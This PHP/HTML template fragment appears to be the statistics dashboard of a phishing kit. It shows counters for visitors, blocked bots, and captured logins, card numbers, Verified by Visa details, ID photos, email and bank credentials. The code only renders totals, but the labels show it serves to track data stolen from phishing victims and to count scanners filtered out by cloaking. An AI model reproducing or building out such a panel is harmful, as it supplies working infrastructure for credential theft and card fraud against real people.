  <?php

  $count_visitor = count_stats('visitor');
  $count_bot = count_stats('block');
  $count_login = count_stats('login');
  $count_card = count_stats('card');
  $count_vbv =count_stats('card-vbv');
  $count_pap = count_stats('pap');
  $count_email = count_stats('email');
  $count_bank = count_stats('bank');

?>
  <br><br>
    <div class="w3-row-padding w3-margin-bottom">
    <div class="w3-half">
      <div class="w3-container w3-teal w3-padding-16">
        <div class="w3-left"><i class="fa fa-users w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_visitor;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Visitors</h4>
      </div>
    </div>
    <div class="w3-half">
      <div class="w3-container w3-blue-gray w3-padding-16">
        <div class="w3-left"><i class="fa fa-bug w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_bot;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Bots</h4>
      </div>
    </div>
</div>
<div class="w3-row-padding w3-margin-bottom">
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-green w3-padding-16">
        <div class="w3-left"><i class="fa fa-sign-in w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_login;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Login</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-amber w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-credit-card w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_card;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Card</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-deep-orange w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-cc-visa w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_vbv;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>VBV</h4>
      </div>
    </div>
</div>
<div class="w3-row-padding w3-margin-bottom">
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-deep-purple w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-photo w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_pap;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Photo</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-purple w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-envelope w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_email;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Email</h4>
      </div>
    </div>
    <div class="w3-col s12 m4 l4">
      <div class="w3-container w3-blue w3-text-white w3-padding-16">
        <div class="w3-left"><i class="fa fa-bank w3-xxxlarge"></i></div>
        <div class="w3-right">
          <h3><?=$count_bank;?></h3>
        </div>
        <div class="w3-clear"></div>
        <h4>Bank</h4>
      </div>
    </div>
  </div>

  </header>
